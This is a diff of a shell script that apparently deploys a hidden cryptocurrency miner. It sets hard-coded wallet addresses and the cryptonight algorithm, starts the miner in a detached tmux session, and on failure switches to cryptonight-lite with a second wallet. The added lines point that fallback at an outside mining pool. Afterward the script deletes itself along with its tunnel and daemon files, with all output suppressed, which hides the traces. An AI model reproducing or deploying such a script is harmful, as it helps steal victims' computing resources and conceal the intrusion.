@@ -96,7 +96,7 @@ PAUSD_RATE=${PAUSD_RATE:-200}
 export \
 ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
-AL=${AL:-cryptonight}
+AL=${AL:-cryptonight} \
 ENDPOINT=${ENDPONT:-127.0.0.1:8080}
 ## subst
 cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
@@ -109,13 +109,14 @@ tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
 slept=0
 while [ "$(tmux ls | wc -l)" -lt 3 ]; do
     slept=$((slept+1))
-    if [ $slept -gt 5 ]; then
+    if [ $slept -gt 5 ]; then ## no aes means crash means aeon
         ## try without hw accel
         PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
         ## switch PA to different co
-        PA=${PA:-WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo} \
+        PA="WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo"
         ## change algo
-        AL=${AL:-cryptonight-lite}
+        AL="cryptonight-lite"
+        ENDPOINT="pool.supportaeon.com:3333" ## temporary
         ## subst
         cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
         ## init
@@ -134,4 +135,3 @@ rm -- "$0" \
    "$TNL_MASK" \
    "$DAEMON" \
    &>/dev/null
-
